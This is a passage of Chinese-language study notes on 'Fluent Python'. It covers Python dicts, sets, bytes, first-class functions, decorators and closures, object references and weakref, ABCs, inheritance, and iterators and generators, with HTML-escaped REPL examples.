会递增键的出现次数&gt;&gt;&gt; ctCounter(&#123;&#x27;a&#x27;: 10, &#x27;z&#x27;: 3, &#x27;b&#x27;: 2, &#x27;r&#x27;: 2, &#x27;c&#x27;: 1, &#x27;d&#x27;: 1&#125;)&gt;&gt;&gt; ct.most_common(2) # 可以返回最常见的 n 个键，此处是最常见的 2 个键[(&#x27;a&#x27;, 10), (&#x27;z&#x27;, 3)] 12345&gt;&gt;&gt; cnt = Counter()&gt;&gt;&gt; for word in [&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;, &#x27;blue&#x27;]:&gt;&gt;&gt; cnt[word] += 1&gt;&gt;&gt; cntCounter(&#123;&#x27;blue&#x27;: 3, &#x27;red&#x27;: 2, &#x27;green&#x27;: 1&#125;) collections.UserDict用于让用户继承来编写子类，与 dict 的不同之处在于它是纯 Python 实现；而 dict 为了性能，某些功能的实现并不完全按照规范； 子类化 UserDict123456789101112131415import collections# 实现 dict[key] 不管 key 是字符串还是数字，都可以正常访问class StrKeyDict(collections.UserDict): def __missing__(self, key): if isinstance(key, str): raise KeyError(key) return self[str(key)] def __contains__(self, key): return str(key) in self.data def __setitem__(self, key, item): self.data[str(key)] = item 一些好用的方法 update 123456&gt;&gt;&gt; td1 = &#123;&#x27;name&#x27;: &#x27;Zara&#x27;, &#x27;age&#x27;: 7&#125;&gt;&gt;&gt; td2 = &#123;&#x27;sex&#x27;: &#x27;female&#x27;&#125;&gt;&gt;&gt; td1.update(td2)&gt;&gt;&gt; td1&#123;&#x27;name&#x27;: &#x27;Zara&#x27;, &#x27;age&#x27;: 7, &#x27;sex&#x27;: &#x27;female&#x27;&#125;&gt;&gt;&gt; 不可变映射类型Python 的标准库并不支持不可变映射类型，但是有个变通的办法来实现相同的效果，即通过 MappingProxyType，从名字可以看得出来它是一个代理，这个代理是只读的； 12345678910111213141516171819&gt;&gt;&gt; from types import MappingProxyType&gt;&gt;&gt; d = &#123;1:&#x27;A&#x27;&#125;&gt;&gt;&gt; d_proxy = MappingProxyType(d) # 创建一个代理&gt;&gt;&gt; d_proxymappingproxy(&#123;1: &#x27;A&#x27;&#125;)&gt;&gt;&gt; d_proxy[1] # 代理是可以访问的&#x27;A&#x27;&gt;&gt;&gt; d_proxy[2] = &#x27;x&#x27; # 但是不可以修改，会报错Traceback (most recent call last):File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;mappingproxy&#x27; object does not support item assignment&gt;&gt;&gt; d[2] = &#x27;B&#x27;&gt;&gt;&gt; d_proxy # 代理可以实时的看到 d 更新后的效果mappingproxy(&#123;1: &#x27;A&#x27;, 2: &#x27;B&#x27;&#125;)&gt;&gt;&gt; d_proxy[2]&#x27;B&#x27; 集合论集合 set 是一些对象的集合，它可以用来去重；集合中的元素必须是可散列的； 12345&gt;&gt;&gt; l = [&#x27;spam&#x27;, &#x27;spam&#x27;, &#x27;eggs&#x27;, &#x27;spam&#x27;]&gt;&gt;&gt; set(l)&#123;&#x27;eggs&#x27;, &#x27;spam&#x27;&#125;&gt;&gt;&gt; list(set(l))[&#x27;eggs&#x27;, &#x27;spam&#x27;] 集合有一些自己的运算符，以便计算合集、交集、差集等； 12# 用 &amp; 符号求交集found = len(needles &amp; haystack) 集合字面量创建空集需要使用 set()， 而不是 { }，不然就变成了字典了； s1 &#x3D; {1, 2, 3} 的性能比 s2 &#x3D; set([1, 2, ,3])，因为后者涉及先构造列表的动作； 集合推导集合推导和列表推导的唯一差别在于方括号 [ ] 还是花括号 { } 1234&gt;&gt;&gt; from unicodedata import name ➊&gt;&gt;&gt; &#123;chr(i) for i in range(32, 256) if &#x27;SIGN&#x27; in name(chr(i),&#x27;&#x27;)&#125; ➋&#123;&#x27;§&#x27;, &#x27;=&#x27;, &#x27;¢&#x27;, &#x27;#&#x27;, &#x27;¤&#x27;, &#x27;&lt;&#x27;, &#x27;¥&#x27;, &#x27;μ&#x27;, &#x27;×&#x27;, &#x27;$&#x27;, &#x27;¶&#x27;, &#x27;£&#x27;, &#x27;©&#x27;,&#x27;°&#x27;, &#x27;+&#x27;, &#x27;÷&#x27;, &#x27;±&#x27;, &#x27;&gt;&#x27;, &#x27;¬&#x27;, &#x27;®&#x27;, &#x27;%&#x27;&#125; 集合的操作集合有不少专属的操作，这些操作很多是通过对运算符的重载来实现的； dict 和 set 背后dict 和 set 背后的实现原理是散列，这样性能就不会因为元素数量的增长出现大多波动；散列本质上是以空间换时间；列表则是以时间换空间； dict 的实现及其结果 注：所有由用户自定义的对象，都是可散列的；因为它的散列值是由 id() 来生成的，跟对象本身的值没有关系。因此所有这些自定义对象，即使值相同，由于 id 不同，它们也是不相等的； 相比列表，元组会比较节省空间；一方面是因为它无须重复存储键名，另一方面是它不需要用到散列； 应避免在迭代的过程中，对字典进行修改，它会给迭代带来扰乱，有可能导致出错，或者结果错乱； 字典 dict 是不可散列的，所以无法直接将 dict 添加到 set 中； 字典 dict 的键名顺序是有可能会变化的，例如当出现散列冲突时或者扩容时； 第4章 文本和字节序列字符问题在 Python3，字符统一使用 Unicode 进行表示（称为码位），这样能够涵盖所有的已知字符，而且这个字符的 Unicode 也是固定的；但是在存储的时候，可以有多种编码方法（将码位转成字节序列），例如 UTF8, UTF16 等；使用不同的编码方法存储，就需要使用相应的解码方法读取，这样出来的结果才是正确的； 字节概要在 Python3，有 bytes 和 bytearray 两种字节序列类型，其内部的元素是 0~255 的整数； bytes[0]，返回一个元素； bytes[:1]，返回一个切片，即一段新的序列 虽然二进制序列在底层是整数序列，但是显示的字面量有多种可能，包括： ASCII 字符 制表符、换行符、回车符、斜杠等特殊符号； 十六进制转义表示 1b&#x27;caf\\xc3\\xa9&#x27; # caf 刚好可以用 Ascii 表示，后来两个只能用十六进制表示 基本的编解码器了解编解码问题处理文本文件为了正确比较而规范化 Unicode 字符串Unicode 文本排序Unicode 数据库支持字符串和字节序列的双模式 API第5章 一等函数把函数视为对象first class 函数满足以下条件： 能够在运行时创建 能够赋值给变量或者数据结构中的元素； 能够做为参数传递给函数； 能够做为结果从函数调用中返回； 简而言之，函数就像一个对象一样（事实上在底层实现也是如此，函数即对象）； 高阶函数高阶函数：higher-order function，接受函数做为参数，或者返回结果为参数； 常用的 map 和 filter，可以用列表推导式和生成器表达式进行替代，看起来更容易理解，示例如下： 12345map(func, range(6))[func(i) for i in range(6)]filter(lambda n : n % 2, range(6))[i for i in range(6) if i % 2] 匿名函数由于 python 的 lambda 函名函数只能写单行的表达式，因此表达能力非常有限，导致使用场景非常少；常用于高阶函数的函数参数；类似下面这个样子 1filter(lambda n : n % 2, range(6)) 可调用对象调用运算符，即一对括号，不仅可以运用在函数上，其实也可以运用在普通对象上； 可用 callable 函数来判断某个对象是否可以调用 用户定义的可调用类型事实上所有对象都是可以调用的，只要对象有实现 call 方法即可； 函数内省 函数内省，function introspection，这个翻译名称有点奇怪； 由于函数是一个对象，因此其实这个对象内部存储着很多与函数有关的信息，示例如下： 从定位参数到仅限关键字参数python 的函数参数处理机制非常灵活强大，既支持固定位置的参数形式，也支持按关键字进行匹配的参数形式。同时还支持使用 * 单星号或者 ** 双星号，将不固定数量的任意个参数，打包成一个可迭代对象，以便在函数体内部进行访问；其中单个星号打包成 tuple 元组的形式；两个星号打包成字典 dict 的形式； 获取关于参数的信息函数内部的属性，可用来做一起有用的事情，示例如下： 此处使用了装饰器，装饰器会检查 hello 函数内部属性中存储的与参数有关的信息。检查后，它会发现 hello 函数需要一个 person 函数；因此，它可以用 query 对象中，获取相应的 person 值，然后作为参数，传递给 hello 函数； _default_ 存储函数参数的默认值； _code_ 是一个对象，它也存储着函数的相关信息，例如： co_varnames 存储着参数名称 + 局部变量名称 co_argcount 存储着函数的参数个数； 直接访问 code 对象或者 default 不是很方便，不过有个 inspect 库提供了方便的查看方式； 函数注解函数注解可用来给参数和返回值备注类型 12def clip(text:str, max_len:&#x27;int &gt; 0&#x27;=80) -&gt; str: # 备注参数和返回值的类型 &quot;&quot;&quot;省略&quot;&quot;&quot; 注解会存储在函数的 _annotations_ 属性中； 注解本身不会做任何事情，有注解跟没有注解是一样的；但是注解可以给第三方工具（例如框架、装饰器等）提供有用的信息，例如 IDE 或者 Lint 工具可以利用注解来检查； 支持函数式编程的包operator 模块operator 模块提供了一些算术运算符函数，它让代码更加简单易懂； 12345from functools import reducefrom operator import mul def fact(n): return reduce(mul, range(1, n+1)) # mul 函数可用来计算两个数值的乘积 itemgetter 可用来读取元组中的元素 1234567891011&gt;&gt;&gt; metro_data = [... (&#x27;Tokyo&#x27;, &#x27;JP&#x27;, 36.933, (35.689722, 139.691667)),... (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, (28.613889, 77.208889)),... (&#x27;Mexico City&#x27;, &#x27;MX&#x27;, 20.142, (19.433333, -99.133333)),... (&#x27;New York-Newark&#x27;, &#x27;US&#x27;, 20.104, (40.808611, -74.020386)),... (&#x27;Sao Paulo&#x27;, &#x27;BR&#x27;, 19.649, (-23.547778, -46.635833)),... ]&gt;&gt;&gt;&gt;&gt;&gt; from operator import itemgetter&gt;&gt;&gt; for city in sorted(metro_data, key=itemgetter(1)): # itemgetter(1) 等同于 lamba fields : fields[1]... print(city) 12345678910# 此处的 itemgetter 的两个参数，表示读取两个位置的值，组成元组&gt;&gt;&gt; cc_name = itemgetter(1, 0)&gt;&gt;&gt; for city in metro_data:... print(cc_name(city))...(&#x27;JP&#x27;, &#x27;Tokyo&#x27;)(&#x27;IN&#x27;, &#x27;Delhi NCR&#x27;)(&#x27;MX&#x27;, &#x27;Mexico City&#x27;)(&#x27;US&#x27;, &#x27;New York-Newark&#x27;)(&#x27;BR&#x27;, &#x27;Sao Paulo&#x27;) attrgetter 与 itemgetter 的不同之处在于它使用名称来提取对象的属性； methodcaller 接受一个参数，表示要调用的函数名称，然后它可以在之后传入的对象中调用相应的方法； 123456789&gt;&gt;&gt; from operator import methodcaller&gt;&gt;&gt; s = &#x27;The time has come&#x27;&gt;&gt;&gt; upcase = methodcaller(&#x27;upper&#x27;) # 表示调用 upper 方法&gt;&gt;&gt; upcase(s) # 在 s 身上调用 upper 方法&#x27;THE TIME HAS COME&#x27;&gt;&gt;&gt; hiphenate = methodcaller(&#x27;replace&#x27;, &#x27; &#x27;, &#x27;-&#x27;) # 调用 replace 方法&gt;&gt;&gt; hiphenate(s) # 在 s 身上调用&#x27;The-time-has-come&#x27; 使用 functools.partial 冻结参数partial 可用来将某个函数的参数设置为固定值 1234567&gt;&gt;&gt; from operator import mul&gt;&gt;&gt; from functools import partial&gt;&gt;&gt; triple = partial(mul, 3) # mul 原本接受两个参数，此处将 mul 的第一个参数固定 3&gt;&gt;&gt; triple(7) # 调用时，只需传入第二个参数即可计算出结果21&gt;&gt;&gt; list(map(triple, range(1, 10))) [3, 6, 9, 12, 15, 18, 21, 24, 27] 第6章 使用一等函数实现设计模式策略模式在函数作为一等公民时，很多设计模式就有了更简单的实现方法了；例如策略模式中，每个策略对应一个类；实际上它们都可以简单替换成函数即可，完全没有必要单独为了调用它而去实例化一个对象； 命令模式命令模式的本意是想在命令的调用者（操作对象）和接收者（实现对象）之间进行解耦，这样调用者无须了解各个接收者具体是什么接口，而让它们对接口进行统一命名；但其实有更简单的做法，即直接将各个实现绑定到调用者身上就可以了，有点像回调那样； 面向对象之所以要搞成那么复杂，完全是因为它们不能接受函数作为参数，而是只能接受对象做为参数，然后再去调用对象的方法，这样就不得不对所调用的方法有个规范命名，不然就不知道如何调用；但如果能够接受函数作为参数，那就完全不一样了，直接将形参当作函数调用即可，非常简单直观，容易理解； 第7章 函数装饰器和闭包装饰器基础知识装饰器是一个可调用的对象，类似函数，它的参数是另外一个函数，它的目的是对该函数进行打包封装，干些额外的工作；它的执行结果有可能会返回参数函数，也有可能是返回另外一个新的函数或可调用对象，并赋值给原本作为参数的函数名称，这样调用者并不知道这个函数可能已经被替换了； 123456789@decoratedef target(): print(&quot;running target()&quot;) # 上面的写法跟下面的写法是一个意思def target(): print(&quot;running target()&quot;) target = decorate(target); Python 何时执行装饰器注意，在定义装饰器的代码文件被加载时，装饰器会被立即执行，此时被装饰的函数还没有被调用； 使用装饰器改进策略模式1234567891011121314151617181920promos = [] def promotion(promo_func): promos.append(promo_func) return promo_func@promotion # 使用装饰器，在添加新的折扣策略时，不容易遗漏def fidelity(order): &quot;&quot;&quot;为积分为1000或以上的顾客提供5%折扣&quot;&quot;&quot; return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0 @promotion @promotion def bulk_item(order): &quot;&quot;&quot;单个商品为20个或以上时提供10%折扣&quot;&quot;&quot; discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discount 变量作用域规则python 在编译函数定义时，它会先检查函数中声明的局部变量； 如果变量存在，那么之后使用变量时，解释器只会在本地作用域中寻找； 如果不存在，那么就会到函数的定义环境中寻找全局变量； global 关键字可用来告知某个变量为全局的，以引导解释器到正确的位置查找 123456&gt;&gt;&gt; b = 6&gt;&gt;&gt; def f3(a):... global b... print(a)... print(b)... b = 9 闭包如果函数引用了某个变量，该不在其定义内部定义，而是在函数外部定义的，那么解释器会在函数对象中，保留一个指向该外部变量的引用，以便在使用该变量时，能够取到相应的值； 12345678def make_averager(): series = [] def averager(new_value): # 此处引用的 series 变量在 averager 外部定义，averager 对象属性中会保存它的引用 series.append(new_value) total = sum(series) return total/len(series) return averager nonlocal 声明1234567891011121314151617181920212223def make_averager(): count = 0 total = 0 def averager(new_value): count += 1 # 此处的表达式等同于 count = count + 1，因此解释器会将 count 当作局部变量 # 因此在执行 count + 1 会出现报错 total += new_value return total / count return averager# 为了解决以上问题，需要用 nonlocal 关键字将 count 和 total 声明为非局部变量def make_averager(): count = 0 total = 0 def averager(new_value): nonlocal count, total # 声明 nonlocal count += 1 total += new_value return total / count return averager 实现一个简单的装饰器1234567891011import timedef clock(func): def clocked(*args): # 不支持关键字参数 t0 = time.perf_counter() result = func(*args) elapsed = time.perf_counter() - t0 name = func.__name__ arg_str = &quot;, &quot;.join(repr(arg) for arg in args) print(&#x27;[%0.8fs] %s(%s) -&gt; %r&#x27; % (elapsed, name, arg_str, result)) return clocked 支持关键字参数的版本 12345678910111213141516171819import timeimport functoolsdef clock(func): @functools.wraps(func) # 用于将函数属性从 func 复制到 clocked 函数中，例如函数名称等 def clocked(*args, **kwargs): # 支持关键字参数 t0 = time.perf_counter() result = func(*args, **kwargs) elapsed = time.perf_counter() - t0 name = func.__name__ arg_lst = [] if args: arg_lst.append(&quot;, &quot;.join(repr(arg) for arg in args)) if kwargs: pairs = [&#x27;%s=%r&#x27; % (k, w) for k, w in sorted(kwargs.items())] arg_lst.append(&quot;, &quot;.join(pairs)) arg_str = &quot;, &quot;.join(arg_lst) print(&#x27;[%0.8fs] %s(%s) -&gt; %r &#x27; % (elapsed, name, arg_str, result)) return clocked 标准库中的装饰器使用 lru_cache 缓存lru_cache 可以帮助缓存函数的计算结果，如果下次再传入相同的参数，则直接从缓存中返回计算结果，不再重复计算，这会极大的提高性能，尤其是存在大量重复计算的场景，例如计算斐波契那数列； lru 的全称 least recently used 单分派泛函数 所谓的分泛函数是指这个函数的功能用于分别派分任务，它根据参数值，使用一串 if elif else 来分别调用相应的函数；在 OO 的语言中一般叫重载，但 Python 不支持重载； singledispatch 装饰器，可以将多个函数组合成一个泛函数； 123456789101112131415161718192021222324from functools import singledispatchfrom collections import abcimport numbersimport html@singledispatch # 将 htmlize 包装成了泛函数，之后它可以注册不同的参数 def htmlize(obj): content = html.escape(repr(obj)) return &#x27;&lt;pre&gt;&#123;&#125;&lt;/pre&gt;&#x27;.format(content)@htmlize.register(str) # 注册重载 str 类型def _(text): content = html.escape(text).replace(&#x27;\\n&#x27;, &#x27;&lt;br&gt;\\n&#x27;) return &#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;.format(content)@htmlize.register(numbers.Integral) # 注册重载 int 类型def _(n): return &#x27;&lt;pre&gt;&#123;0&#125; (0x&#123;0:x&#125;)&lt;/pre&gt;&#x27;.format(n)@htmlize.register(tuple) # 注册 tuple 类型@htmlize.register(abc.MutableSequence) # 可多个类型叠加def _(seq): inner = &#x27;&lt;/li&gt;\\n&lt;li&gt;&#x27;.join(htmlize(item) for item in seq) return &#x27;&lt;ul&gt;\\n&lt;li&gt;&#x27; + inner + &#x27;&lt;/li&gt;\\n&lt;/ul&gt;&#x27; singledispatch 可以用来装饰自己编写的函数，也可以用来装饰他人编写的函数； 叠放装饰器装饰器支持叠放 1234567@d1@d2def f(): print(&quot;f&quot;) #等同于f = d1(d2(f)) 参数化装饰器通过创建一个装饰器工厂函数，便可使装饰器支持传入参数；调用该装饰器工厂函数时，返回的是真正的装饰器； 第8章 对象引用、可变性和垃圾回收变量不是盒子变量本身是一个独立的东西，我们借助它，让它指向某个对象，以方便实现引用该对象； 标识、相等性和别名在 Python 中，判断两个对象是否相同，有两种方法，一种是 &#x3D;&#x3D; 两个等号，一种是使用关键字 is，它们的意思是不一样的；&#x3D;&#x3D; 会调用对象的 __eq __ 方法进行判断，它比的是值相等即可，is 等是判断对象的 id，相当于内存的地址； 由于 is 比较的是地址，因为使用 is 进行判断它的性能很好；因为使用 &#x3D;&#x3D; 进行判断的话，需要遍历对象的属性值； object 类型的 eq 方法比较的是 id，但是其他大多数内置类型的 eq 方法比较的是值； 当元组用于保存对象时，它保存的是对象的引用。虽然元组本身不可变，但这个引用背后的对象自身是可以变的； 默认做浅复制如果要做深复制，需要使用 deepcopy 方法；浅复制则使用 copy 方法； 函数的参数作为引用时千万不要将函数参数的默认值设置为可变对象，而应该设置为 None；因为如果是可变对象，那么在函数载入时，会自动创建出来；这样导致多次不传参数的调用该函数时，多个函数都会指向该默认值，造成相互影响； 12345678910class HauntedBus: def __init__(self, passengers=[]): # 这里默认值 [] 是大忌，千万要避免 self.passengers = passengers def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name) 如果函数的参数是一个可变对象，那么让函数对该对象进行修改，会直接作用到外部的实参对象上。有时候，这是想要的结果，有时候则不是非预期的结果。如果是非预期的结果，那么函数内部应对该实参进行复制； del 和垃圾回收del 关键字并不是用来销毁对象的，而仅仅是切割变量和对象之间的引用关系；当对象的引用数量为零时，销毁的工作会垃圾回收器处理； 弱引用弱引用不会增加对象的引用计数，这样不会对对象的垃圾回收带来干扰；一般用于有生命周期限制的缓存管理中； 12345678910111213141516171819&gt;&gt;&gt; import weakref&gt;&gt;&gt; a_set = &#123;0, 1&#125;&gt;&gt;&gt; wref = weakref.ref(a_set) ➊&gt;&gt;&gt; wref&lt;weakref at 0x100637598; to &#x27;set&#x27; at 0x100636748&gt;&gt;&gt;&gt; wref() ➋&#123;0, 1&#125;&gt;&gt;&gt; a_set = &#123;2, 3, 4&#125; ➌&gt;&gt;&gt; wref() ➍&#123;0, 1&#125;&gt;&gt;&gt; wref() is None ➎False&gt;&gt;&gt; wref() is None ➏True WeakValueDictionary 是一种可变映射（字典也是一种可变映射），映射指向的值是对象的弱引用；当对象被回收时，对应的键会自动从 WeakValueDictionary 中被删除；因此，它很适合用来做缓存； 12345678910111213141516171819202122class Cheese: def __init__(self, kind): self.kind = kind def __repr__(self): return &#x27;Cheese(%r)&#x27; % self.kind &gt;&gt;&gt; import weakref&gt;&gt;&gt; stock = weakref.WeakValueDictionary() # 实例化&gt;&gt;&gt; catalog = [Cheese(&#x27;Red Leicester&#x27;), Cheese(&#x27;Tilsit&#x27;),... Cheese(&#x27;Brie&#x27;), Cheese(&#x27;Parmesan&#x27;)]...&gt;&gt;&gt; for cheese in catalog:... stock[cheese.kind] = cheese # 将 stock 的键映射到 cheese 实例上...&gt;&gt;&gt; sorted(stock.keys())[&#x27;Brie&#x27;, &#x27;Parmesan&#x27;, &#x27;Red Leicester&#x27;, &#x27;Tilsit&#x27;] ➌&gt;&gt;&gt; del catalog&gt;&gt;&gt; sorted(stock.keys())[&#x27;Parmesan&#x27;] # 为什么删除 catalog 后，没有全部删除，而是还剩下一个？&gt;&gt;&gt; del cheese # for 循环中的 cheese 是全局变量，因此需要显式删除，不然仍然有一个引用&gt;&gt;&gt; sorted(stock.keys())[] 不是每个 python 对象都可以被弱引用，例如常用的 list 和 dict 实例无法被弱引用，但是它们的子类可以；set 实例也可以 1234567class MyList(list):&quot;&quot;&quot;list的子类，实例可以作为弱引用的目标&quot;&quot;&quot;a_list = MyList(range(10))# a_list可以作为弱引用的目标wref_to_a_list = weakref.ref(a_list) Python 对不可变类型施加的把戏使用一个元组构建另外一个元组，结果得到的是同一个元组 1234&gt;&gt;&gt; t1 = (1, 2, 3)&gt;&gt;&gt; t2 = tuple(t1)&gt;&gt;&gt; t2 is t1True 在 CPython 中，当对象的引用数量为零，会立即触发垃圾回收。但其他 Python 实现则不一定如此；这里涉及到性能的权衡； 第9章 符合 Python 风格的对象对象表示形式Python 默认使用两个函数来表示对象的字符串形式，它们分别是 repr() 和 str() 函数。它们实际上调用的是对象的 _repr_ 和 _str_ 另外还有一个 bytes() 函数会调用 _bytes_ 方法来返回字节序列； 再谈向量类以下是自定义向量类的待实现功能 1234567891011121314151617181920&gt;&gt;&gt; v1 = Vector2d(3, 4)&gt;&gt;&gt; print(v1.x, v1.y) # 能够通过点运算符，直接访问属性3.0 4.0&gt;&gt;&gt; x, y = v1 # 支持元组拆包&gt;&gt;&gt; x, y(3.0, 4.0)&gt;&gt;&gt; v1 # repr 的显示格式Vector2d(3.0, 4.0)&gt;&gt;&gt; v1_clone = eval(repr(v1)) # 基于 repr 结果生成对象&gt;&gt;&gt; v1 == v1_clone # 支持 == 运算符True&gt;&gt;&gt; print(v1) # str 的实现(3.0, 4.0)&gt;&gt;&gt; octets = bytes(v1) # 生成实例的二进制表示&gt;&gt;&gt; octetsb&#x27;d\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x08@\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10@&#x27;&gt;&gt;&gt; abs(v1) # 支持 abs 方法，返回实例的模5.0&gt;&gt;&gt; bool(v1), bool(Vector2d(0, 0)) # 支持 bool 方法，模为零时，返回 False(True, False) 备选构造方法classmethod 与 staticmethodclassmethod 修饰的函数，调用时，不需要实例化对象；该函数的第一个参数是类本身，从而可以借助该函数，访问类的相关成员； classmethod 的一个常见用途时定义额外的构造方法，一般该构造方法会对传入的数据进行清洗，之后再构造对象； 12345@classmethoddef frombytes(cls, octets): # 第一个参数不是 self, 而是类本身 typecode = chr(octets[0]) memv = memoryview(octets[1:]).cast(typecode) return cls(*memv) 格式化显示12&gt;&gt;&gt; &#x27;1 BRL = &#123;rate:0.2f&#125; USD&#x27;.format(rate=brl) # rate 表示具名变量&#x27;1 BRL = 0.41 USD&#x27; 关于如何格式化，python 有一套自己的语法规则，可称之为微语言；这套微语言是可扩展的，可以自定义如何解释 forma_spec 参数 可散列的 Vector2d通过实现 _hash_ 和 _eq_ 方法，可将一个不可散列的自定义类的对象，变成可散列的； Python 的私有属性和受保护的属性python 没有类似 Java 中的 private 关键字，而是通过给类成员的名称添加两个下划线前缀，将该成员标记为私有成员，类似这样：__x，但也有一些人喜欢使用一个下划线来表示； 对于私有属性，解释器在实例化对象时，会给这些属性加上类名作为前缀，这样一来，直接用双下划线访问私有属性时，会提示该属性并不存在，从而实现访问控制；但实际上是可以访问的，只是曲折一点，需要加上类名前缀来访问； 使用 slots 类属性节省空间默认情况下，类的实例在 _dict_ 字段中使用字典来存储属性成员，如果成员比较多的，会占据较大的内存，此时可考虑使用 _slot_ 属性来存储以节省内存；它的原理是使用元组来存储，所以节省内存； 123class Vector2d: __slots__ = (&#x27;__x&#x27;, &#x27;__y&#x27;) typecode = &#x27;d&#x27; 覆盖类属性Python 的类属性可以为实例属性提供默认值，这个默认值在实例中可以被重新赋值； 如果要批量处理，则可以考虑定义一个子类，该子类的属性重写，之后使用子类来实例化对象； 第10章 序列的修改、散列和切片鸭子类型：只要实现一些约定的接口，即可当作拥有目标类型的特征，并可以像目标类型一样被处理；例如一个类只需要实现 getitem 和 len 两个接口，那么它就可以被当作序列类型一样处理，至于它是谁的子类，并不重要； zip 函数可用于并行迭代多个序列，它会将多个序列的对象打包成元组，然后可以拆包赋值给各个变量； 第11章 接口：从协议到抽象基类接口与协议一个类只需要实现了某些特定的接口，它就可以被当作特定的类型进行操作（即鸭子类型）； 当一个类实现了 getitem 接口时，即使它没有实现 contains 和 iter 接口，它也是可迭代，并且支持 in 运算符的；因为解释器会调用 getitem 接口来实现以上两项功能； Python 类中的方法，第一个参数叫 self 纯粹是一种惯例，其实叫个其他名字也无妨； 猴子补丁猴子补丁：如果一个类在定义时，没有定义某个方法；之后在运行时，可以在外部单独定义一个函数，然后把这个函数绑定到类的某个属性上，这样就让类动态获得了某个方法； 抽象基类抽象基类一般用于编写框架的场景，如果是业务场景，几乎不太可能需要自己编写抽象基类，而是使用现成的就可以了； 当继承抽象基类，就需要手工实现抽象基类中规定的所有方法，不管该方法是否用得到； 标准库中的 ABC ABC：抽象基类，abstract base class 不可变集合：Sequence, Mapping, Set 可变集合：MutableSequence, MutableMapping, MutableSet 数字塔numbers 包定义了数字抽象基类的线性层次结构：Number &lt; Complex &lt; Real &lt; Rational &lt; Integral； 第12章 继承的优缺点子类化内置类型很麻烦内置类型的方法不会调用子类覆盖后的方法，它只会调用内置类型原本的方法；因此，不会子类化内置类型，Python 有专门给用户子类化的类型，以 User 开头，例如 UserDict、UserList、UserString 等； 猜测原因在于内置类型的很多方法，出于性能考虑，是用 C 语言专门优化过的，因此不严格遵行继承的定义； 多重继承和方法解析顺序多重继承会面临菱形问题，即子类继承多个父类中，存在同名的方法，导致子类无法确定应该执行哪个父类的同名方法； 多重继承的真实应用处理多重继承Django 示例第13章 正确重载运算符第14章 可迭代对象、迭代器和生成器 迭代器模式：惰性加载数据，处理时加载，这样可以用较小的内存，处理很大的数据集； Python 中使用生成器来实现迭代器模式；生成器也是为了迭代数据，因此可将它当作迭代器来使用，唯一的区别在于它的惰性； 在 Python3 中，生成器是很普遍的，只是使用的时候没有觉察，例如 range(10) 返回的是一个类似生成器的对象；如果想要获得完整的列表，需要写成 list(range(10))； 可迭代对象和迭代器对比区别：从可迭代对象中，获取迭代器；迭代器如果迭代完毕，则不再可用，需要重新构建； 所谓的迭代器，可以理解为一个对象，每次调用它的 next 方法，可返回一个元素；如果空了，会报错； 通常迭代器还有一个 iter 方法，调用这个方法，可返回迭代器本身；理论上不实现它，也不会影响迭代功能。但如果实现了它，issubclass 方法可将其判断为 Iterator 的子类； 可迭代对象也有一个 iter 方法，调用它，会返回一个新的迭代器； 生成器函数1234567891011121314151617import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) # iter 使用了 yield 关键字，调用 iter 会返回生成器对象，此时 iter 是个生成器函数 def __iter__(self): for word in self.words: yield word 生成器函数的工作原理yield 关键字有点像 await，每次执行到 yield 所在的语句时，会暂停等待； for 循环语句会自动捕获并处理迭代器抛出的异常； 惰性实现re 模块除了 findall 函数，还有一个生成器版本的 finditer 函数；它每次只返回一个匹配项；当数据量很大时，可以节省很多内存； 123456789101112131415import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) def __iter__(self): for match in RE_WORD.finditer(self.text): # finditer 返回生成器 yield match.group() 生成器表达式生成器表达式有点像是列表推导的惰性版本； 123456789101112131415161718192021222324252627282930&gt;&gt;&gt; def gen_AB(): # ➊... print(&#x27;start&#x27;)... yield &#x27;A&#x27;... print(&#x27;continue&#x27;)... yield &#x27;B&#x27;... print(&#x27;end.&#x27;)...&gt;&gt;&gt; res1 = [x*3 for x in gen_AB()] # res1 是一个列表，由生成器 gen_Ab 的返回值组成startcontinueend.&gt;&gt;&gt; for i in res1: # ➌... print(&#x27;--&gt;&#x27;, i)...--&gt; AAA--&gt; BBB&gt;&gt;&gt; res2 = (x*3 for x in gen_AB()) # res2 是一个生成器&gt;&gt;&gt; res2 &lt;generator object &lt;genexpr&gt; at 0x10063c240&gt;&gt;&gt;&gt; for i in res2: # 遍历 res2，此时 gen_AB 函数才真正的执行... print(&#x27;--&gt;&#x27;, i)...start--&gt; AAAcontinue--&gt; BBBend. 12345678910111213141516import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) # 使用表达式构建一个生成器，而不是用 yield 来生成 # 生成器表达式是一个语法糖，本质上跟使用 yield 的生成器函数没有区别 def __iter__(self): return (match.group() for match in RE_WORD.finditer(self.text)) 何时用生成器表达式生成器表达式是构建生成器的简捷方式，无需通过 def 定义函数来实现；但限于一些简单场景，一行可以搞定的那种；如果业务逻辑比较复杂，一行代码搞不定的话，则仍然需要使用函数来定义； 标准库 itertools 模块中有很多现成的生成器； itertools.count(start, step)：创建一个数字生成器 itertools.takewhile 给生成器添加条件限制 123&gt;&gt;&gt; gen = itertools.takewhile(lambda n: n &lt; 3, itertools.count(1, .5))&gt;&gt;&gt; list(gen)[1, 1.5, 2.0, 2.5] 标准库中的生成器在创建任何生成器前，很有必要先查一下标准库中有哪些生成器可用，以避免重复造轮子； yield fromyield from 可用来作为可迭代对象的生成器 123456789101112131415161718&gt;&gt;&gt; def chain(*iterables):... for it in iterables:... for i in it:... yield i...&gt;&gt;&gt; s = 